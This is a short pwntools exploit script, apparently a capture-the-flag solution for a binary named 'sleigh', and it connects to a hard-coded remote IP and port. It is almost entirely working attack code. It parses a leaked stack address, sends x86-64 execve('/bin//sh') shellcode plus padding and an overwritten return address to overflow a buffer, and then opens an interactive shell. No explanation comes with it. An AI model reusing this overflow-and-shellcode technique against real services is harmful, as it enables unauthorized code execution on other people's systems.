from pwn import *

local = False
host, port = '167.71.134.105','31706'

r = process('./sleigh') if local else remote(host, port)

f = ELF('./sleigh')

shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
shellcode+=b'\x40'*41

def first_step(r):
	log.info(r.recvuntil('> '))

def exp(r):
	print('=> {}'.format(r.recvline()))
	addr = int(r.recvline().decode().split()[-1].strip()[1:-1],16)
	print('ADDR = {}'.format(hex(addr)))

	log.info(r.recvuntil('> '))
	r.sendline(shellcode+p64(addr)*3)

if __name__=='__main__':
	first_step(r)
	r.sendline('1')
	exp(r)	
	r.interactive()
	




